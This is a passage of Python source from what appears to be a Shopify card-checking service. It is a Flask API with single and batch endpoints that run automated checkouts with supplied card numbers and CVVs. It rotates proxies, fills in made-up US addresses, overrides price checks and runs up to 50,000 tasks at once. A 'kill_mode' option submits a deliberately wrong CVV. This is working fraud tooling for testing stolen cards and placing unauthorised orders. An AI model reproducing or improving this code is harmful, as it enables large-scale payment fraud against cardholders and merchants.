                        submit_variables['input']['taxes']['proposedTotalAmount'] = {'any': True}
                        if 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                            submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {'any': True}
                        if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'any': True}
                    except Exception as exc:
                        logger.debug("Suppressed exception: %s", exc, exc_info=True)
                    if attempt < 3:
                        await asyncio.sleep(0.3)
                        continue
                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                if "The requested payment method is not available." in text:
                    return False, "Payment method not available", gateway, total_price, currency

                try:
                    resp_json = safe_json_loads(text)
                    if not resp_json:
                        return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency

                    submit_data = (resp_json.get('data') or {}).get('submitForCompletion', {})

                    if not submit_data:
                        errors = resp_json.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency
                                msg = error.get('message')
                                if msg:
                                    return False, f"GQL Err: {msg}", gateway, total_price, currency
                        return False, f"Empty submit response: {text[:50]}", gateway, total_price, currency

                    result_type = submit_data.get('__typename', '')

                    if result_type == 'Throttled':
                        queueToken = submit_data.get('queueToken') or queueToken
                        submit_variables['input']['queueToken'] = queueToken
                        poll_after = submit_data.get('pollAfter', 2.0)

                        # التحسين: معالجة Throttled مع تدوير البروكسي
                        if attempt < 3:
                            await asyncio.sleep(min(poll_after * (1 + attempt * 0.5), 10.0))
                            continue
                        else:
                            new_proxy = _rotate_fallback_proxy(proxy)
                            if new_proxy:
                                proxy = new_proxy
                                logger.info(f"[THROTTLED] Proxy rotated to {proxy}")
                                continue
                            return False, "RATE_LIMITED_429", gateway, total_price, currency

                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                        receipt = submit_data.get('receipt', {})
                        if receipt:
                            receipt_type = receipt.get('__typename', '')

                            if receipt_type == 'ProcessedReceipt':
                                return True, "ORDER_PLACED", gateway, total_price, currency

                            rid = receipt.get('id')
                            if not rid:
                                return True, "ORDER_PLACED", gateway, total_price, currency
                        else:
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        break

                    elif result_type == 'SubmitFailed':
                        reason = submit_data.get('reason', '')
                        localized = submit_data.get('localizedMessage', '') or submit_data.get('nonLocalizedMessage', '')
                        msg = localized or extract_clean_response(reason) or 'CARD_DECLINED'
                        return False, msg, gateway, total_price, currency

                    elif result_type == 'SubmitRejected':
                        errors = submit_data.get('errors', [])
                        has_recoverable_error = False
                        if errors:
                            recoverable_codes = {
                                'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
                                'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                                'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
                                'REQUIRED_ARTIFACTS_UNAVAILABLE',
                                'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
                                'MERCHANDISE_EXPECTED_PRICE_MISMATCH',
                                'DESTINATION_ADDRESS_REQUIRED',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
                                'DELIVERY_COMPANY_REQUIRED',
                                'TAX_NEW_TAX_MUST_BE_ACCEPTED',
                                'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
                                'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
                                'PAYMENTS_ZONE_NOT_FOUND'
                            }
                            hard_card_error_codes = {
                                'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
                                'PAYMENTS_CREDIT_CARD_EXPIRED',
                                'PAYMENTS_CREDIT_CARD_GENERIC_DECLINE',
                                'PAYMENTS_CREDIT_CARD_CARD_DECLINED',
                                'PAYMENTS_CREDIT_CARD_VELOCITY_EXCEEDED',
                                'PAYMENTS_CREDIT_CARD_STOLEN_CARD',
                                'PAYMENTS_CREDIT_CARD_PICK_UP_CARD',
                                'PAYMENTS_CREDIT_CARD_CVV_MISMATCH',
                                'PAYMENT_AMOUNT_TOO_SMALL',
                                'CARD_DECLINED',
                                'PAYMENT_FAILED',
                            }
                            has_hard_card_error = False
                            hard_card_msg = None
                            has_recoverable_error = False
                            for error in errors:
                                code = error.get('code', '')
                                emsg = (error.get('localizedMessage', '') or
                                        error.get('nonLocalizedMessage', '') or '').lower()
                                if code in hard_card_error_codes:
                                    has_hard_card_error = True
                                    hard_card_msg = code
                                    break
                                if (code in recoverable_codes or
                                    "total has changed" in emsg or
                                    "delivery details" in emsg or
                                    "currency" in emsg or
                                    "price" in emsg):
                                    has_recoverable_error = True

                            if has_hard_card_error:
                                return False, hard_card_msg or "CARD_DECLINED", gateway, total_price, currency

                        if has_recoverable_error and attempt < 3:
                            logger.debug(f"[RECOVERY DEBUG] errors: {errors}")
                            seller_prop = submit_data.get('sellerProposal')
                            if seller_prop:
                                new_currency = None
                                total_data = seller_prop.get('total') or {}
                                if total_data:
                                    new_currency = (total_data.get('value') or {}).get('currencyCode')
                                if not new_currency:
                                    running_total_data = seller_prop.get('runningTotal') or {}
                                    if running_total_data:
                                        new_currency = (running_total_data.get('value') or {}).get('currencyCode')
                                if not new_currency:
                                    seller_merch = seller_prop.get('merchandise') or {}
                                    if seller_merch:
                                        seller_m_lines = seller_merch.get('merchandiseLines') or []
                                        if seller_m_lines:
                                            new_currency = ((seller_m_lines[0].get('totalAmount') or {}).get('value') or {}).get('currencyCode')

                                if new_currency:
                                    currency = new_currency
                                    original_currency = currency
                                    submit_variables['input']['buyerIdentity']['customer']['presentmentCurrency'] = new_currency
                                    if 'value' in submit_variables['input']['payment']['paymentLines'][0]['amount']:
                                        submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['currencyCode'] = new_currency
                                    if 'totalAmount' in submit_variables['input']['payment'] and 'value' in submit_variables['input']['payment']['totalAmount']:
                                        submit_variables['input']['payment']['totalAmount']['value']['currencyCode'] = new_currency
                                    if 'value' in submit_variables['input']['taxes']['proposedTotalAmount']:
                                        submit_variables['input']['taxes']['proposedTotalAmount']['value']['currencyCode'] = new_currency
                                    if 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                                        if 'value' in submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['currencyCode'] = new_currency
                                    if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                                        if 'value' in submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']['value']['currencyCode'] = new_currency

                                new_merch_price = None
                                seller_merch = seller_prop.get('merchandise') or {}
                                if seller_merch:
                                    seller_m_lines = seller_merch.get('merchandiseLines') or []
                                    if seller_m_lines:
                                        new_merch_price = ((seller_m_lines[0].get('totalAmount') or {}).get('value') or {}).get('amount')

                                if new_merch_price and 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                                    submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['amount'] = new_merch_price

                                new_running = ((seller_prop.get('runningTotal') or {}).get('value') or {}).get('amount')
                                new_tax_str = '0.00'
                                new_tax_data = seller_prop.get('tax') or {}
                                if new_tax_data and new_tax_data.get('__typename') == 'FilledTaxTerms':
                                    new_tax_str = ((new_tax_data.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0.00')

                                new_strategy = ''
                                new_shipping_str = '0.00'
                                new_delivery_line_id = ''
                                new_dest_none = False
                                d_lines = None
                                new_delivery = seller_prop.get('delivery', {})
                                if new_delivery and new_delivery.get('__typename') == 'FilledDeliveryTerms':
                                    d_lines = new_delivery.get('deliveryLines', [])
                                    if d_lines:
                                        new_delivery_line_id = d_lines[0].get('id', '')
                                        sel_strat = d_lines[0].get('selectedDeliveryStrategy', {})
                                        if sel_strat:
                                            new_strategy = sel_strat.get('handle', '')

                                        avail_strats = d_lines[0].get('availableDeliveryStrategies') or []
                                        if avail_strats and len(avail_strats) > 0:
                                            try:
                                                def get_strat_price(s):
                                                    try:
                                                        return float(s.get('amount', {}).get('value', {}).get('amount', '0'))
                                                    except:
                                                        return 999999.0
                                                avail_strats = sorted(avail_strats, key=get_strat_price)
                                            except Exception as exc:
                                                logger.debug("Suppressed exception: %s", exc, exc_info=True)
                                            if not new_strategy:
                                                new_strategy = avail_strats[0].get('handle', '')
                                            for strat in avail_strats:
                                                if strat.get('handle') == new_strategy:
                                                    new_shipping_str = ((strat.get('amount') or {}).get('value') or {}).get('amount', '0.00')
                                                    break
                                            else:
                                                new_shipping_str = ((avail_strats[0].get('amount') or {}).get('value') or {}).get('amount', '0.00')
                                    else:
                                        new_strategy = None
                                else:
                                    new_strategy = None

                                if new_running:
                                    if 'value' in submit_variables['input']['payment']['paymentLines'][0]['amount']:
                                        submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = new_running
                                    if 'totalAmount' in submit_variables['input']['payment'] and 'value' in submit_variables['input']['payment']['totalAmount']:
                                        submit_variables['input']['payment']['totalAmount']['value']['amount'] = new_running
                                    try:
                                        rate = EXCHANGE_RATES.get(currency.upper(), 1.0)
                                        if currency.upper() != "USD" and rate != 1.0:
                                            t_amt = round(float(new_running) * rate, 2)
                                            subtotal = round(float(subtotal) * rate, 2)
                                            new_tax_str = round(float(new_tax_str) * rate, 2)
                                            new_shipping_str = round(float(new_shipping_str) * rate, 2)
                                            display_currency = "USD"
                                        else:
                                            t_amt = round(float(new_running), 2)
                                            display_currency = currency
                                    except:
                                        t_amt = round(float(new_running), 2)
                                        display_currency = currency

                                    total_price = f"{format_price(t_amt, display_currency)} [Min Prod: {format_price(subtotal, display_currency)} | Tax: {format_price(new_tax_str, display_currency)} | Ship: {format_price(new_shipping_str, display_currency)}]"

                                if 'value' in submit_variables['input']['taxes']['proposedTotalAmount']:
                                    submit_variables['input']['taxes']['proposedTotalAmount']['value']['amount'] = new_tax_str

                                has_dest_req = False
                                for e in errors:
                                    code = e.get('code', '')
                                    if code == 'TAX_NEW_TAX_MUST_BE_ACCEPTED':
                                        try:
                                            sig = (seller_prop.get('nonNegotiableTerms') or {}).get('signature')
                                            if sig:
                                                submit_variables['input']['nonNegotiableTerms'] = {'signature': sig}
                                        except Exception as exc:
                                            logger.debug("Suppressed exception: %s", exc, exc_info=True)
                                    elif code == 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH':
                                        try:
                                            flex_id = ((seller_prop.get('payment') or {}).get('paymentFlexibilityPaymentTermsTemplate') or {}).get('id')
                                            if flex_id:
                                                submit_variables['input']['payment']['paymentLines'][0]['paymentFlexibilityTermsId'] = flex_id
                                        except (KeyError, IndexError, TypeError):
                                            pass
                                    elif code == 'DESTINATION_ADDRESS_REQUIRED':
                                        has_dest_req = True
                                        is_shipping_required = True
                                    elif code in ('MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE', 'PAYMENTS_ZONE_NOT_FOUND', 'PAYMENTS_POSTAL_CODE_REQUIRED'):
                                        country_code = 'US'
                                        address_info = book['US']
                                        street = f"{address_info['address1']} Apt {random.randint(1, 999)}"
                                        city = address_info['city']
                                        state = address_info['zoneCode']
                                        s_zip = address_info['postalCode']
                                        has_dest_req = True
                                        is_shipping_required = True


                                if new_strategy is None and not has_dest_req:
                                    if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                                        submit_variables['input']['delivery']['deliveryLines'] = []
                                        submit_variables['input']['delivery']['noDeliveryRequired'] = [{'stableId': stableId or '1'}]
                                elif 'deliveryLines' in submit_variables['input']['delivery']:
                                    if not submit_variables['input']['delivery']['deliveryLines'] or has_dest_req:
                                        new_line = {
                                            'targetMerchandiseLines': {
                                                'lines': [{'stableId': stableId or '1'}]
                                            },
                                            'deliveryMethodTypes': ['SHIPPING'],
                                            'expectedTotalPrice': {
                                                'value': {'amount': new_shipping_str, 'currencyCode': currency}
                                            },
                                            'destinationChanged': False
                                        }
                                        if street:
                                            new_line['destination'] = {
                                                'streetAddress': {
                                                    'address1': street, 'address2': address2 or '', 'city': city,
                                                    'countryCode': country_code, 'postalCode': s_zip,
                                                    'firstName': firstName, 'lastName': lastName,
                                                    'zoneCode': state, 'phone': phone
                                                }
                                            }
                                            if any(e.get('code') == 'DELIVERY_COMPANY_REQUIRED' for e in errors):
                                                new_line['destination']['streetAddress']['company'] = 'LLC'

                                        if has_dest_req:
                                            new_line['selectedDeliveryStrategy'] = {
                                                'deliveryStrategyMatchingConditions': {
                                                    'estimatedTimeInTransit': {'any': True},
                                                    'shipments': {'any': True}
                                                },
                                                'options': {}
                                            }
                                            new_line['destinationChanged'] = True
                                            new_line['expectedTotalPrice'] = {'any': True}

                                        submit_variables['input']['delivery']['deliveryLines'] = [new_line]
                                        submit_variables['input']['delivery']['noDeliveryRequired'] = []

                                    if not has_dest_req:
                                        if submit_variables['input']['delivery']['deliveryLines'][0].get('selectedDeliveryStrategy') is None:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': new_strategy, 'customDeliveryRate': False}, 'options': {}}
                                        else:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy']['deliveryStrategyByHandle']['handle'] = new_strategy
                                        if 'value' in submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']['value']['amount'] = new_shipping_str

                                    if any(e.get('code') == 'DELIVERY_COMPANY_REQUIRED' for e in errors):
                                        try:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['destination']['streetAddress']['company'] = 'LLC'
                                        except (KeyError, IndexError):
                                            pass

                                if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines'] and d_lines:
                                    if d_lines[0].get('destinationAddress') is None and not is_shipping_required:
                                        if 'destination' in submit_variables['input']['delivery']['deliveryLines'][0]:
                                            del submit_variables['input']['delivery']['deliveryLines'][0]['destination']

                                await asyncio.sleep(0.2)
                                continue

                        if errors:
                            for error in errors:
                                code = error.get('code', '')
                                localized_msg = (error.get('localizedMessage', '') or
                                                error.get('localizedMessageHtml', '') or
                                                error.get('nonLocalizedMessage', ''))
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and localized_msg:
                                    return False, localized_msg, gateway, total_price, currency
                                if code:
                                    # التحسين: معالجة PRICE_TOO_HIGH مع مسح الكاش
                                    if code == 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' or "total has changed" in localized_msg.lower():
                                        cache_key = normalize_cache_key(ourl)
                                        _VARIANT_CACHE.pop(cache_key, None)
                                        return False, "PRICE_TOO_HIGH", gateway, total_price, currency
                                    if code == 'VALIDATION_CUSTOM' and localized_msg:
                                        return False, localized_msg, gateway, total_price, currency
                                    return False, code, gateway, total_price, currency
                                if localized_msg:
                                    return False, localized_msg, gateway, total_price, currency
                        return False, "CARD_DECLINED", gateway, total_price, currency

                    receipt = submit_data.get('receipt', {})
                    if not receipt:
                        if result_type:
                            return False, f"No receipt in submit response (type: {result_type})", gateway, total_price, currency
                        return False, "No receipt in submit response", gateway, total_price, currency

                    rid = receipt.get('id')
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency
                    break

                except json.JSONDecodeError:
                    return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
                except Exception as e:
                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            if not rid:
                return False, "GATEWAY_TIMEOUT", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            for i in range(6):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=0
                )

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json = safe_json_loads(final_text)
                    if not poll_json:
                        continue
                    receipt_data = (poll_json.get('data') or {}).get('receipt') or {}

                    if receipt_data:
                        typename = receipt_data.get('__typename', '')

                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(0.2)
                            continue
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
                if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                    await asyncio.sleep(0.2)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency

            if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                return False, "GATEWAY_TIMEOUT", gateway, total_price, currency

            try:
                res_json = safe_json_loads(final_text)
                if not res_json:
                    return False, "GATEWAY_TIMEOUT", gateway, total_price, currency
                receipt_obj = (res_json.get('data') or {}).get('receipt') or {}
                err_data = receipt_obj.get('processingError', {}) if receipt_obj else {}

                if err_data:
                    code = err_data.get('code')
                    msg = err_data.get('messageUntranslated')
                    if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '', None) and msg:
                        return True, msg, gateway, total_price, currency
                    if code:
                        return True, code, gateway, total_price, currency
                    return True, "PAYMENT_FAILED", gateway, total_price, currency

                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif receipt_obj and receipt_obj.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception as exc:
                logger.debug("Suppressed exception: %s", exc, exc_info=True)
            code = extract_between(final_text, '{"code":"', '"')

            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Proxy Error: Unknown Result", gateway, total_price, currency

    except asyncio.TimeoutError:
        return False, "Request Timeout", gateway, total_price, currency
    except Exception as e:
        err_msg = str(e)
        err_lower = err_msg.lower()
        if "gaierror" in err_lower or "getaddrinfo" in err_lower or ("dns" in err_lower and "resolution" in err_lower):
            return False, "DNS resolution failed (site offline/invalid)", gateway, total_price, currency
        if any(marker in err_lower for marker in _CURL_RETRY_ERRORS):
            return False, f"Proxy Error: {err_msg}", gateway, total_price, currency
        if any(t in err_lower for t in ('timeout', 'timed out', 'time out', 'asyncio.timeout')):
            return False, f"Request Timeout: {err_msg}", gateway, total_price, currency
        logger.error(f"[{cc}] Error processing card: {err_msg}")
        return False, f"Error Processing Card: {err_msg}", gateway, total_price, currency

# التحسين: دالة parse_cc_string محسّنة
def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cvv_match = re.search(r'\d+', parts[3])
    if not cvv_match:
        raise ValueError("Invalid CC format. CVV must contain digits.")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': cvv_match.group(0)
    }

# ──────────────────────── Concurrency Engine ────────────────────────

MAX_CONCURRENT = 50000
_loop = None
_loop_thread = None
_loop_lock = threading.Lock()
_semaphore = None
_user_semaphores = {}
_user_semaphore_refs = {}
ACTIVE_WORKERS = 0

async def _shutdown_background_resources():
    current = asyncio.current_task()
    pending = [task for task in asyncio.all_tasks() if task is not current and not task.done()]
    for task in pending:
        task.cancel()
    if pending:
        await asyncio.gather(*pending, return_exceptions=True)

    sessions = []
    with _SESSION_POOL_STATE_LOCK:
        for pool in _SESSION_POOL.values():
            sessions.extend(pool)
        _SESSION_POOL.clear()

    for session in sessions:
        try:
            await session.close()
        except Exception as exc:
            logger.debug("Suppressed exception while closing pooled session: %s", exc, exc_info=True)

    global _global_connector, _global_connector_loop
    connector = _global_connector
    _global_connector = None
    _global_connector_loop = None
    if connector is not None and not connector.closed:
        try:
            await connector.close()
        except Exception as exc:
            logger.debug("Suppressed exception while closing connector: %s", exc, exc_info=True)

    _user_semaphores.clear()
    _user_semaphore_refs.clear()
    _PER_SITE_SEMAPHORES.clear()
    _PER_SITE_SEMAPHORE_REFS.clear()

    global _SESSION_POOL_LOCK, _PER_SITE_LOCK, _semaphore
    _SESSION_POOL_LOCK = None
    _PER_SITE_LOCK = None
    _semaphore = None


def _start_background_loop(loop):
    logger.info("Background loop starting...")
    asyncio.set_event_loop(loop)
    try:
        loop.run_forever()
    finally:
        if not loop.is_closed():
            try:
                loop.run_until_complete(_shutdown_background_resources())
            except Exception as exc:
                logger.debug("Suppressed exception during loop cleanup: %s", exc, exc_info=True)


def stop_background_loop(timeout=10):
    global _loop, _loop_thread
    with _loop_lock:
        loop = _loop
        thread = _loop_thread
        if loop is None or loop.is_closed() or thread is None:
            return
        if threading.current_thread() is thread:
            return

        if thread.is_alive():
            try:
                future = asyncio.run_coroutine_threadsafe(_shutdown_background_resources(), loop)
                future.result(timeout=timeout)
            except Exception as exc:
                logger.debug("Background resource shutdown failed: %s", exc, exc_info=True)
            try:
                loop.call_soon_threadsafe(loop.stop)
            except Exception as exc:
                logger.debug("Unable to stop background loop: %s", exc, exc_info=True)
            thread.join(timeout=timeout)

        if not thread.is_alive() and not loop.is_closed():
            try:
                loop.close()
            except Exception as exc:
                logger.debug("Unable to close background loop: %s", exc, exc_info=True)
            _loop = None
            _loop_thread = None


# التحسين: دالة get_event_loop مع Lock للحماية
def get_event_loop():
    global _loop, _loop_thread
    with _loop_lock:
        loop_alive = (
            _loop is not None
            and not _loop.is_closed()
            and _loop_thread is not None
            and _loop_thread.is_alive()
        )
        if not loop_alive:
            _loop = asyncio.new_event_loop()
            _loop_thread = threading.Thread(
                target=_start_background_loop,
                args=(_loop,),
                daemon=True,
                name="background-asyncio-loop",
            )
            _loop_thread.start()
        return _loop

async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec=40, check_only=False, uid=None):
    global _semaphore, _user_semaphores, _user_semaphore_refs, ACTIVE_WORKERS
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    safe_uid = str(uid) if uid else "unknown"
    if safe_uid not in _user_semaphores:
        _user_semaphores[safe_uid] = asyncio.Semaphore(500)
        _user_semaphore_refs[safe_uid] = 0
    _user_semaphore_refs[safe_uid] = _user_semaphore_refs.get(safe_uid, 0) + 1

    logger.info(f"[{cc}] Acquired semaphores, waiting...")
    try:
        async with _semaphore:
            async with _user_semaphores[safe_uid]:
                ACTIVE_WORKERS += 1
                try:
                    MAX_OUTER_RETRIES = 2
                    for outer_attempt in range(MAX_OUTER_RETRIES + 1):
                        logger.info(f"[{cc}] Calling process_card (outer attempt {outer_attempt + 1})...")
                        success, message, gateway, price, currency = await process_card(
                            cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
                        )

                        # التحسين: معالجة PRICE_TOO_HIGH مع مسح الكاش وإعادة المحاولة
                        if (not success and
                                isinstance(message, str) and
                                'PRICE_TOO_HIGH' in message.upper()):
                            if outer_attempt < MAX_OUTER_RETRIES:
                                cache_key = normalize_cache_key(site_url)
                                if cache_key in _VARIANT_CACHE:
                                    del _VARIANT_CACHE[cache_key]
                                logger.info(f"[{cc}] PRICE_TOO_HIGH — clearing cache and retrying "
                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
                                await asyncio.sleep(0.5)
                                continue
                            else:
                                message = "PRICE_TOO_HIGH"

                        if (not success and
                                isinstance(message, str) and
                                'ORDER_TOTAL_CHANGED' in message.upper()):
                            if outer_attempt < MAX_OUTER_RETRIES:
                                cache_key = normalize_cache_key(site_url)
                                if cache_key in _VARIANT_CACHE:
                                    del _VARIANT_CACHE[cache_key]
                                logger.info(f"[{cc}] ORDER_TOTAL_CHANGED — session expired, retrying full checkout "
                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
                                await asyncio.sleep(0.5)
                                continue
                            else:
                                message = "DYNAMIC_PRICING_UNSUPPORTED"

                        if (not success and
                                isinstance(message, str) and
                                ('CAPTCHA_REQUIRED' in message.upper() or
                                 any(kw in message for kw in ('Proxy Error:', 'Request Timeout:', 'Proxy Error: Request failed')))):
                            return success, message, gateway, price, currency

                        return success, message, gateway, price, currency
                    return success, message, gateway, price, currency
                finally:
                    ACTIVE_WORKERS -= 1

    finally:

        refs = _user_semaphore_refs.get(safe_uid, 0) - 1
        if refs <= 0:
            _user_semaphore_refs.pop(safe_uid, None)
            _user_semaphores.pop(safe_uid, None)
        else:
            _user_semaphore_refs[safe_uid] = refs

# ═══════════════════════════════════════════════════════════════════
# التحسين: دالة _parse_timeout_value
def _parse_timeout_value(value, default):
    """Parse a request timeout while preserving existing defaults."""
    if value is None or value == "":
        return default
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        return default
    return parsed if parsed > 0 else default


# ──────────────────────── Flask App ─────────────────────────────────

app = Flask(__name__)

# ── Single-card endpoint ──────────────────────────────────────────────
@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site') or request.args.get('url')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        uid = request.args.get('uid')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            if request.args.get('kill_mode'):
                real_cvv = cc_parts['cvv']
                wrong_cvv = real_cvv
                while wrong_cvv == real_cvv:
                    wrong_cvv = str(random.randint(0, (10**len(real_cvv))-1)).zfill(len(real_cvv))
                cc_parts['cvv'] = wrong_cvv
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get('variant')
        loop = get_event_loop()

        timeout_val = request.args.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 45)

        check_only_val = request.args.get('check_only', '0')
        check_only = check_only_val in ('1', 'true', 'True')

        logger.info(f"[{cc_string}] Submitting to event loop...")
        future_timeout = timeout_sec + 60
        future = asyncio.run_coroutine_threadsafe(
            _throttled_process(
                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
                site, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
            ),
            loop
        )
        logger.info(f"[{cc_string}] Waiting for future (timeout={future_timeout}s)...")
        success, message, gateway, price, currency = future.result(timeout=future_timeout)
        logger.info(f"[{cc_string}] Future completed.")

        return jsonify(_build_result(cc_string, success, message, gateway, price, currency, site))

    except Exception as e:
        logger.error(f"Error in shopify_checker: {e}")
        return jsonify({
            "error": str(e), "status": False,
            "Gateway": "UNKNOWN", "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

# ── Batch endpoint ────────────────────────────────────────────────────
@app.route('/batch', methods=['POST'])
def batch_checker():
    try:
        data = request.get_json(force=True)
        site = data.get('site', '')
        cards = data.get('cards', [])
        variant_id = data.get('variant')
        uid = data.get('uid')

        proxy_list = data.get('proxies', [])
        single_proxy = data.get('proxy')
        if not proxy_list and single_proxy:
            proxy_list = [single_proxy]

        if not site:
            return jsonify({"error": "Missing 'site' field", "status": False}), 400
        if not cards or not isinstance(cards, list):
            return jsonify({"error": "Missing or invalid 'cards' array", "status": False}), 400
        if len(cards) > 2500:
            return jsonify({"error": f"Max 2500 cards per batch request. Please chunk your lists.", "status": False}), 400

        parsed = []
        for i, cc_string in enumerate(cards):
            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
            try:
                parts = parse_cc_string(cc_string.strip())
                if data.get('kill_mode'):
                    real_cvv = parts['cvv']
                    wrong_cvv = real_cvv
                    while wrong_cvv == real_cvv:
                        wrong_cvv = str(random.randint(0, (10**len(real_cvv))-1)).zfill(len(real_cvv))
                    parts['cvv'] = wrong_cvv
                parsed.append((cc_string.strip(), parts, proxy_for_card))
            except ValueError:
                parsed.append((cc_string.strip(), None, proxy_for_card))

        timeout_val = data.get('timeout')
        timeout_sec = _parse_timeout_value(timeout_val, 40)

        loop = get_event_loop()

        async def _run_batch():
            tasks = []
            for cc_string, parts, px in parsed:
                if parts is None:
                    async def _bad(cs=cc_string):
